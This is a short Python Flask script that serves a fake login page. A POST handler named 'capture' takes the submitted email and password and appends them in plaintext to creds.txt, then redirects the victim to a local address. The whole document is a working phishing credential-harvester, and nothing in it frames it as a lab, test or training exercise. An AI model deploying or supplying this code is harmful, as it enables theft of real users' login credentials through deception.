from flask import Flask, request, redirect
import os
app = Flask(__name__)

@app.route("/fake_login", methods=["GET"])
@app.route("/", methods=["GET"])
def show_login():
    return open("/var/www/html/index.html").read()

@app.route("/submit_credentials", methods=["POST"])
def capture():
    email = request.form.get("email")
    password = request.form.get("password")
    with open("creds.txt", "a") as f:
        f.write(f"Email: {email}, Password: {password}\\n")
    return redirect("http://localhost:8125")
   

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))

